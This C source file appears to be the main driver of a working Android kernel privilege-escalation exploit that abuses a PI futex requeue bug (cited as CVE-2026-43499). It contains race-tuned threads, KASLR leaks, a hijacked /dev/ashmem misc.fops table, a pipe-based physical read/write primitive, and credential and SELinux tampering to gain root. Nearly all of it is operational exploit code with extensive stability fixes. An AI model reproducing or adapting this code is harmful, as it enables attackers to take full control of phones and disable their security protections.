#include "common.h"

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int consumer_done;
atomic_int pselect_planted;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
/* Cooperative PI teardown: owner drops f_pi_target/f_pi_chain before the
 * process dies, or rt_mutex cleanup walks the CVE's dangling
 * waiter->pi_blocked_on and CPU0 spins forever (watchdog reboot). */
atomic_int route_pi_release;
atomic_int route_pi_released;
atomic_int pi_cleanup_done;
atomic_int self_root_ok;
atomic_int waiter_exited;
atomic_int owner_exited;
static pthread_t g_waiter_thread;
static pthread_t g_owner_thread;
static pthread_t g_consumer_thread;
int memfd_leak;
/* 1 = owner_thread owns f_pi_target (default, original), 0 = main thread,
 * 2 = nobody. Default MUST keep owner as target owner: main's
 * FUTEX_CMP_REQUEUE_PI then hits the rt_mutex_start_proxy_lock deadlock
 * rollback (EDEADLK), whose buggy remove_waiter() (CVE-2026-43499) leaves
 * waiter->pi_blocked_on dangling at the waiter thread's stack rt_waiter —
 * that stale pointer is what the consumer's rt_mutex_adjust_pi chain reads
 * during the pselect route. V1 (main owns target) avoided the rollback and
 * therefore never triggered the bug at all. */
int pi_target_owner_mode = 1;

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  prctl(PR_SET_NAME, "ks_waiter", 0, 0, 0);

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  pr_info("waiter thread start tid=%d\n", tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  long wr = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  pr_info("waiter requeue_pi ret=%ld errno=%d\n", wr, errno);

  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  /* CVE-2026-43499: waiter->pi_blocked_on points at this thread's kernel
   * stack rt_waiter.  Returning frees the stack; the next rt_mutex chain
   * walk (process exit or another PI futex op) reads the freed page and
   * oopses -> panic -> watchdog reboot.  Two conditions must hold before
   * this thread may exit:
   *   1) pi_cleanup_done: root.c cleared pi_blocked_on via the pipe
   *      primitive (or we hold forever below);
   *   2) route_pi_released: the owner thread finished its
   *      FUTEX_UNLOCK_PI on f_pi_chain/f_pi_target, because those unlocks
   *      walk waiters trees that can still reference this stack.
   */
  pr_info("waiter waiting for pi_cleanup before exit\n");
  for (int i = 0; i < 500 &&
       !(atomic_load(&pi_cleanup_done) && atomic_load(&route_pi_released));
       i++) {
    usleep(10000);
  }
  if (!atomic_load(&pi_cleanup_done) || !atomic_load(&route_pi_released)) {
    /* root.c holds the process forever when the clear fails, so this path
     * only happens on a failed run where main is about to exit anyway. */
    pr_warning("waiter timeout: pi_cleanup=%d route_pi_released=%d; exiting "
               "(process teardown follows)\n",
               atomic_load(&pi_cleanup_done), atomic_load(&route_pi_released));
  }
  atomic_store(&waiter_exited, 1);
  pr_info("waiter pi_cleanup done; exiting\n");
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  prctl(PR_SET_NAME, "ks_owner", 0, 0, 0);
  pr_info("owner thread start tid=%ld\n", (long)syscall(SYS_gettid));

  if (pi_target_owner_mode == 1) {
    long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    if (lock_target != 0) {
      pr_error("owner lock target errno=%d\n", errno);
    }
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  while (!atomic_load(&route_done) && !atomic_load(&route_pi_release)) {
    usleep(1000);
  }
  /*
   * Never carry PI ownership into process teardown: rt_mutex cleanup with
   * the CVE's dangling waiter->pi_blocked_on spins CPU0 forever
   * (observed as watchdog reboots ~20s after every exit(-1)).
   */
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  if (pi_target_owner_mode == 1) {
    futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  }
  atomic_store(&route_pi_released, 1);
  atomic_store(&owner_exited, 1);
  return NULL;
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  prctl(PR_SET_NAME, "ks_consumer", 0, 0, 0);
  pr_info("consumer thread start tid=%ld\n", (long)syscall(SYS_gettid));
  pin_to_core(CONSUMER_CORE);

  int seen = 0;
  /* Alternate nice every call: __sched_setscheduler's no-change fast path
   * (same SCHED_BATCH policy AND same nice) jumps straight to the epilogue
   * and never reaches the rt_mutex_adjust_pi gate at 0x2b80a4, so a constant
   * nice only triggers the chain on the first policy change. */
  int nice_alt = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      while (!atomic_load(&punch_consume_stop) &&
             atomic_load(&punch_consume_go) == seq &&
             !atomic_load(&pselect_planted)) {
        __asm__ volatile("yield" ::: "memory");
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        int consumer_nice = PSELECT_CONSUMER_NICE - (nice_alt & 1);
        nice_alt++;
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, consumer_nice);
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
        } else {
          pr_warning("consumer sched_setattr ret=%ld errno=%d tid=%d seq=%d\n",
                     sched_ret, errno, tid, seq);
        }
        atomic_fetch_add(&consumer_done, 1);
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&consumer_done, 0);
  atomic_store(&pselect_planted, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  atomic_store(&route_pi_release, 0);
  atomic_store(&route_pi_released, 0);
  atomic_store(&pi_cleanup_done, 0);
  atomic_store(&waiter_exited, 0);
  atomic_store(&owner_exited, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
  expected_misc_fops = 0;
}

static int g_ashmem_guard_restore = -1;

/* app-uid rounds: perf_event_open is denied to untrusted_app, which would
 * force the slide fallback (its pselect probe panics under app uid).  A
 * shell/root round of the SAME boot persists kaslr_base via
 * ks_persist_kaslr_file(); take it, with a boot_id match so a previous
 * boot's value can never point at an unmapped address. */
static int kaslr_from_shared_file(void) {
  const char *path = getenv("KS_KASLR_FILE");
  if (!path || !path[0])
    path = "/data/local/tmp/ksu_kaslr";
  int fd = open(path, O_RDONLY);
  if (fd < 0)
    return 0;
  char buf[256];
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0)
    return 0;
  buf[n] = 0;
  char boot_file[80], boot_now[80];
  unsigned long long text = 0, slide = 0;
  memset(boot_file, 0, sizeof(boot_file));
  if (sscanf(buf, "kaslr boot=%79s text=%llx slide=%llx", boot_file, &text,
             &slide) != 3) {
    pr_info("kaslr file: parse failed path=%s\n", path);
    return 0;
  }
  memset(boot_now, 0, sizeof(boot_now));
  int bfd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
  if (bfd < 0) {
    pr_info("kaslr file: boot_id read errno=%d; rejecting %s\n", errno, path);
    return 0;
  }
  ssize_t bn = read(bfd, boot_now, sizeof(boot_now) - 1);
  close(bfd);
  while (bn > 0 && (boot_now[bn - 1] == '\n' || boot_now[bn - 1] == '\r'))
    boot_now[--bn] = 0;
  if (strcmp(boot_file, boot_now) != 0) {
    pr_info("kaslr file: boot mismatch file=%s now=%s; rejecting\n",
            boot_file, boot_now);
    return 0;
  }
  if (text < (unsigned long long)KIMAGE_TEXT_BASE ||
      text >= 0xffffffff00000000ULL || (text & 0xfff) != 0 ||
      slide != text - (unsigned long long)KIMAGE_TEXT_BASE) {
    pr_info("kaslr file: range check fail text=%016llx\n", text);
    return 0;
  }
  kaslr_base = text;
  kaslr_slide = slide;
  kaslr_done = 1;
  pr_success("text-base-ok pid=%d text=%016llx slide=%016llx (shared file)\n",
             getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide);
  return 1;
}

static void ashmem_guard_restore(void) {
  if (g_ashmem_guard_restore >= 0) {
    if (chmod("/dev/ashmem", g_ashmem_guard_restore) != 0) {
      pr_warning("ashmem guard restore failed errno=%d mode=%o\n", errno,
                 g_ashmem_guard_restore);
    } else {
      pr_info("ashmem guard off mode=%o\n", g_ashmem_guard_restore);
    }
    g_ashmem_guard_restore = -1;
  }
}

/*
 * While the route holds misc.fops hijacked, any third-party open of
 * /dev/ashmem walks our planted table (Chrome_IOThread died in
 * try_module_get on a recycled payload page during the pipe window).
 * Take the dev node to 0600 for the duration; our already-open fd is
 * unaffected by node perms.  Restored on normal return and via atexit
 * (pr_error path).
 */
static void ashmem_guard_on(void) {
  if (g_ashmem_guard_restore >= 0)
    return;
  struct stat ast;
  if (stat("/dev/ashmem", &ast) != 0) {
    pr_warning("ashmem guard stat failed errno=%d\n", errno);
    return;
  }
  g_ashmem_guard_restore = ast.st_mode & 07777;
  if (chmod("/dev/ashmem", 0600) != 0) {
    pr_warning("ashmem guard chmod failed errno=%d\n", errno);
    g_ashmem_guard_restore = -1;
    return;
  }
  atexit(ashmem_guard_restore);
  pr_info("ashmem guard on prev=%o\n", g_ashmem_guard_restore);
}

static void route_pi_release_atexit(void) {
  atomic_store(&punch_consume_stop, 1);
  atomic_store(&route_pi_release, 1);
  /* If the exiting thread is the chain holder (waiter-side pr_error), drop
   * the chain lock so the owner can acquire it, observe the release flag,
   * and unblock f_pi_target too.  EPERM from other threads is harmless. */
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  for (int i = 0; i < 100 && !atomic_load(&route_pi_released); i++) {
    usleep(10000);
  }
  if (!atomic_load(&route_pi_released)) {
    pr_warning("route PI release timed out; exit may wedge rt_mutex\n");
  }
}

void run_main_route_threads(void) {
  reset_main_route_state();
  /*
   * Gate doomed runs BEFORE any PI thread exists.  The two observed
   * bailouts (corrupt slot ledger, payload page never landed) used to be
   * pr_error->exit(-1) taken from the waiter thread while owner held the
   * PI futexes; rt_mutex teardown then walked the CVE's dangling waiter
   * and spun CPU0 until the watchdog rebooted the device.
   */
  pselect_route_preflight();
  if (!page_base || !fake_lock || !fake_fops) {
    const char *skip_page = getenv("KS_SKIP_PAGE");
    int no_page = skip_page && skip_page[0] && strcmp(skip_page, "0") != 0;
    if (!no_page) {
      pr_warning("route gate: missing payload page base=%p lock=%p fops=%p; "
                 "skip PI handshake\n",
                 (void *)page_base, (void *)fake_lock, (void *)fake_fops);
      return;
    }
  }
  ashmem_guard_on();
  fops_guard_start();
  atexit(route_pi_release_atexit);

  const char *owner_env = getenv("PI_TARGET_OWNER");
  if (owner_env && !strcmp(owner_env, "main")) {
    pi_target_owner_mode = 0;
  } else if (owner_env && !strcmp(owner_env, "none")) {
    pi_target_owner_mode = 2;
  } else {
    pi_target_owner_mode = 1;
  }

  if (pi_target_owner_mode == 0) {
    long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    if (lock_target != 0) {
      pr_error("main lock target errno=%d\n", errno);
    }
  }

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  g_waiter_thread = waiter;
  g_owner_thread = owner;
  g_consumer_thread = consumer;

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);
  errno = 0;
  /*
   * EDEADLK (errno 35) here is EXPECTED: owner holds f_pi_target, so the
   * requeue hits rt_mutex_start_proxy_lock's deadlock rollback — the
   * buggy remove_waiter() in that path (CVE-2026-43499) is what leaves
   * waiter->pi_blocked_on dangling.  Do NOT retry or treat it as failure.
   */
  long rr = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  pr_info("main cmp_requeue ret=%ld errno=%d\n", rr, errno);

  for (int i = 0; !atomic_load(&route_done); i++) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pipebuf_page_base = prepare_pipe_buffer_page();
      atomic_store(&pipe_prepare_done, 1);
    }
    if (i == 12000) {
      /* root.c holds forever inside the waiter thread when pi_cleanup fails
       * on a successful root; route_done then never arrives. */
      pr_warning("route_done not set after 120s (pi_cleanup=%d root=%d); "
                 "holding process\n",
                 atomic_load(&pi_cleanup_done),
                 root_child_done || atomic_load(&self_root_ok));
    }
    if (i >= 12000) {
      for (;;) {
        pause();
      }
    }
    usleep(10000);
  }
  /*
   * Do not return while the waiter/owner threads are still alive: the
   * process exiting would tear down their kernel stacks while the CVE's
   * dangling waiter->pi_blocked_on still points into them (panic).  Waiter
   * exits only after pi_cleanup_done && route_pi_released; consumer exits
   * once punch_consume_stop is set.
   */
  /*
   * Waiter's own pi_cleanup wait is 500x10ms = 5s; on a failed run
   * pi_cleanup_done stays 0 and the waiter only force-exits after that
   * window.  The old 300-iteration (3s) bound expired FIRST and parked
   * this thread in pause() forever (run26 deadlock: waiter exited at +5s
   * but nobody was looking -> constructor never returned -> run_fops
   * never wrote DONE).  Bound must exceed the waiter's worst case.
   */
  for (int i = 0; i < 1500 && !atomic_load(&waiter_exited); i++) {
    usleep(10000);
  }
  if (!atomic_load(&waiter_exited)) {
    pr_warning("waiter did not exit after route (pi_cleanup=%d released=%d); "
               "holding process\n",
               atomic_load(&pi_cleanup_done), atomic_load(&route_pi_released));
    for (;;) {
      pause();
    }
  }
  atomic_store(&punch_consume_stop, 1);
  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  pthread_join(consumer, NULL);
  pr_info("route threads joined (waiter exited cleanly)\n");
  ashmem_guard_restore();
}

int opt_disabled_selinux;
int opt_keep_selinux_context;
int opt_patch_self;

static int env_truthy_default(const char *name, int def) {
  const char *env = getenv(name);
  if (!env || !env[0]) {
    return def;
  }
  return strcmp(env, "0") != 0 && strcasecmp(env, "false") != 0 &&
         strcasecmp(env, "no") != 0;
}

static int env_truthy(const char *name) {
  return env_truthy_default(name, 0);
}

/*
 * Defense③ v4: drop the chain's fake-fops fd (g_fops_probe_fd, a dup of the
 * hijacked cfi fd) after zeroing its close-path slots.  The panics were
 * never about page liveness: with KS_PSELECT_FOPS_VOFF the fd's f_op is
 * table+1, so filp_close reads flush as table[0x79..0x80] (residue 0x10 ->
 * old pc=0x10) and __fput's fops_put reads owner as table[0x01..0x08]
 * (llseek byte leaks into the top -> module_put+0x38, the v2 round).
 * ks_neutralize_fake_fops_close() zeroes owner/flush/release/fasync through
 * the same +1 anchor, after which close is safe from any context.  Disarm
 * the guard first so it stops using the fd (a racing guard read fails
 * benignly with EBADF: read failures only count, never write).
 */
static void close_fake_fops_probe_fd(const char *why) {
  if (g_fops_probe_fd < 0) {
    return;
  }
  int fd = g_fops_probe_fd;
  g_fops_probe_fd = -1;
  fops_guard_set_expect(0);
  ks_neutralize_fake_fops_close(fd);
  close(fd);
  pr_info("exit tail: closed fake-fops probe fd=%d (%s)\n", fd, why);
}

int run_exploit(int argc, char **argv) {
  ks_layout_init();
  opt_disabled_selinux = env_truthy_default("DISABLE_SELINUX", 1);
  opt_keep_selinux_context = env_truthy("ROOT_KEEP_CONTEXT");
  opt_patch_self = env_truthy_default("ROOT_PATCH_SELF", 1);
  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "--disabled-selinux") == 0) {
      opt_disabled_selinux = 1;
    } else if (strcmp(argv[i], "--keep-selinux-context") == 0) {
      opt_keep_selinux_context = 1;
    } else if (strcmp(argv[i], "--patch-self") == 0) {
      opt_patch_self = 1;
    }
  }

  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  log_startup_context();
  init_ashmem_path();

  pin_to_core(CORE);
  pselect_payload_lock = env_truthy("KS_PSELECT_PAYLOAD_LOCK");
  if (kaslr_done && ks_kaslr_from_kallsyms) {
    pr_success("text-base-ok pid=%d text=%016llx slide=%016llx (kallsyms)\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
  } else {
    uint64_t text_base = 0;
    for (int try = 1; try <= 3 && !text_base; try++) {
      text_base = perf_leak_text_base();
      if (!text_base && try < 3) {
        pr_warning("perf text-base attempt %d failed; retrying\n", try);
      }
    }
    if (text_base) {
      kaslr_base = text_base;
      kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
      kaslr_done = 1;
      pr_success("text-base-ok pid=%d text=%016llx slide=%016llx (perf)\n",
                 getpid(), (unsigned long long)kaslr_base,
                 (unsigned long long)kaslr_slide);
    } else if (kaslr_from_shared_file()) {
      /* shared-file hit: text-base-ok printed inside; app-uid rounds get
       * the verified FOPS path instead of the panicking slide route. */
    } else if (env_truthy("KS_SKIP_PAGE")) {
      /*
       * The paranoid write probe derives its target from kaslr_base, so a
       * guessed base writes into the wrong kernel address and oopses.  The
       * slide fallback runs a second legacy pselect route that has already
       * panicked this device, so refuse rather than gamble.
       */
      pr_error("kaslr leak failed; KS_SKIP_PAGE probe refuses the slide "
               "fallback (a wrong base is an unmapped write)\n");
      return 1;
    } else if (!slide_leak_kernel_base()) {
      pr_error("kaslr leak failed\n");
      return 1;
    }
  }
  if (env_truthy("KS_CFGFS_PROBE")) {
    ks_cfgfs_probe();
    if (env_truthy("KS_CFGFS_PROBE_ONLY")) {
      return 0;
    }
  }
  if (env_truthy("KS_TEXT_SIG")) {
    int fd = open_ashmem_device();
    uint64_t sig = 0;
    ssize_t n = configfs_read_once(fd, text_addr(KIMAGE_TEXT_BASE), &sig, 8);
    pr_success("text-sig base=%016llx n=%zd sig=%016llx\n",
               (unsigned long long)kaslr_base, (ssize_t)n,
               (unsigned long long)sig);
    if (fd >= 0) close(fd);
  }
  if (env_truthy("SLIDE_ONLY")) {
    pr_success("slide-only done base=%016zx slide=%016zx\n",
               kaslr_base, kaslr_slide);
    return 0;
  }
  /* KS_KASLR_ONLY: leak + persist the text base and leave WITHOUT
   * entering the route.  The full chain ends in a tail panic that reboots
   * the device, which rotates KASLR and invalidates a file written by a
   * succeeding round — so app-uid rounds of the same boot consume a file
   * from this cheap round instead (perf leak is denied to untrusted_app). */
  if (env_truthy("KS_KASLR_ONLY")) {
    ks_persist_kaslr_file();
    pr_success("kaslr-only done base=%016zx slide=%016zx; exiting\n",
               kaslr_base, kaslr_slide);
    return 0;
  }
  if (env_truthy("KS_PVO_ORACLE")) {
    run_pvo_oracle();
    return 0;
  }

  pin_to_core(CORE);
  if (env_truthy("KS_SKIP_PAGE")) {
    pr_warning("KS_SKIP_PAGE: skipping prepare_good_kernel_page (paranoid "
               "write probe does not need the payload page)\n");
  } else if (env_truthy("KS_PAYLOAD_PASTE")) {
    /* Exam-2 app-uid rounds: perf/tp are SELinux-denied here, so the
     * capture oracles and every payload-page verify are dead -- a blind
     * drain + route lands misc.fops on a garbage page and the first
     * ashmem open panics (boot b3d9924c).  Take the page verified and
     * held by a shell round of the SAME boot instead (ks_payload_paste,
     * boot_id+kaslr gated).  Refuse rather than fall back to the blind
     * prepare: a wrong table is a kernel panic, not a safe miss. */
    if (!ks_payload_paste()) {
      pr_error("payload paste failed; refusing blind route (garbage table "
               "panics on open)\n");
      return 1;
    }
  } else {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  }

  const char *halt_env = getenv("KS_PREPARE_HALT");
  if (halt_env && halt_env[0]) {
    int halt_secs = atoi(halt_env);
    if (halt_secs > 0 && halt_secs < 3600) {
      /* Holder mode (exam-2): persist BOTH shared files before parking --
       * the page is verified here (shell/root oracles) and stays pinned
       * for the app-uid round to paste; the kaslr file also satisfies its
       * readyToTrigger gate. */
      ks_persist_kaslr_file();
      ks_persist_payload_file();
      pr_success("prepare-halt pid=%d sleep=%d payload alive at page_base=%016zx "
                 "fake_fops=%016zx\n",
                 getpid(), halt_secs, page_base, fake_fops);
      int pulse_fd = reclaim_recv_fd();
      for (int i = 0; i < halt_secs * 5; i++) {
        if (pulse_fd >= 0) {
          fcntl(pulse_fd, F_GETFD);
        }
        usleep(200000);
      }
      return 0;
    }
  }

  run_main_route_threads();

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done),
             root_child_done || atomic_load(&self_root_ok),
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u sid=%u/%u->%u/%u "
             "selinux=%u->%u setgid=%d setuid=%d setenforce=%d/%d\n",
             getpid(), atomic_load(&cfi_stage_done),
             root_child_done || atomic_load(&self_root_ok), kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after, cred_sid_before, real_cred_sid_before,
             cred_sid_after, real_cred_sid_after, selinux_before, selinux_after,
             setgid_ret, setuid_ret, setenforce_ret, setenforce_errno);
  if (pipe_prepare_child > 0) {
    /* Best-effort: clear forged pipe_buffer.ops before any fd close triggers
     * free_pipe_info -> put_page on kernel pages.  On the success path this
     * was already done in pi_cleanup while fops were still hijacked; here it
     * only helps if the primitive still works.  Do not hold on failure. */
    int probe_fd = g_fops_probe_fd >= 0 ? g_fops_probe_fd : open_ashmem_device();
    if (probe_fd >= 0) {
      if (!pipe_clear_forged_ops(probe_fd)) {
        pr_warning("exit pipe ops clear failed (fops may be restored)\n");
      }
      if (probe_fd != g_fops_probe_fd) {
        pr_info("exit tail: closing probe_fd=%d\n", probe_fd);
        close(probe_fd);
      }
    }
    /* Defense③ v3 helper: zero the fake table's flush/release/fasync
     * slots (the 0x10 residue in flush, never written by the builder, is
     * what every success round's close() jumped to), then close the fd --
     * here, while the pipe clear above has just re-proven the page live. */
    close_fake_fops_probe_fd("after pipe clear, before child kill");
    pr_info("exit tail: killing pipe_prepare_child=%d\n",
            (int)pipe_prepare_child);
    if (kill(pipe_prepare_child, SIGKILL) != 0) {
      pr_warning("cleanup kill pipe_prepare_child=%d failed errno=%d\n",
                 pipe_prepare_child, errno);
    } else {
      while (waitpid(pipe_prepare_child, NULL, 0) < 0 && errno == EINTR) {
      }
      pr_info("exit tail: pipe_prepare_child reaped\n");
    }
  } else {
    /* No child to kill (prepare never ran): the payload page has no
     * child-death free event pending, so dropping the fd now is equivalent
     * to the old end-of-tail close but strictly earlier. */
    close_fake_fops_probe_fd("no pipe child");
  }
  const char *sleep_env = getenv("ROOT_EXIT_SLEEP");
  if (sleep_env && sleep_env[0]) {
    int sleep_secs = atoi(sleep_env);
    if (sleep_secs > 0 && sleep_secs < 300) {
      sleep((unsigned int)sleep_secs);
    }
  }
  pr_info("exit tail: constructor returning\n");
  return 0;
}
